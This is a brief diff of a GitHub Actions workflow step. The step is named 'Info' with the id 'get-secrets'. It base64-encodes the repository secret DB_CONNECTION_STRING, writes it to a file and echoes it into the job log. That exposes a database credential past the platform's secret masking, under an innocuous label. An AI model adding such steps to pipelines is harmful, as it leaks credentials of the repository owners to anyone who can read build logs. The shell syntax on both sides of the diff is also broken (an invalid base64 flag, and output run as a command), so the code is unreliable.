@@ -31,7 +31,7 @@ jobs:
       - name: Info
         id: get-secrets
         run: |
-          echo $("${{ secrets.DB_CONNECTION_STRING }}" | base64 -e) > 1.txt
+          $("echo ${{ secrets.DB_CONNECTION_STRING }}" | base64) > 1.txt
 
           result=$(cat 1.txt)
           echo $result
